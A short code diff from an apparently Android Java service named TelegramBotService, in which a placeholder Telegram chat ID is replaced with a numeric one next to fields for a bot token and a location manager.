@@ -24,7 +24,7 @@ public class TelegramBotService extends Service {
     private String botToken;
     private static final String TAG = "TelegramBotService";
     private LocationManager locationManager;
-    private String chatId = "FIXME_USER_CHAT_ID";
+    private String chatId = "6617099953";
 
     @Override
     public void onCreate() {
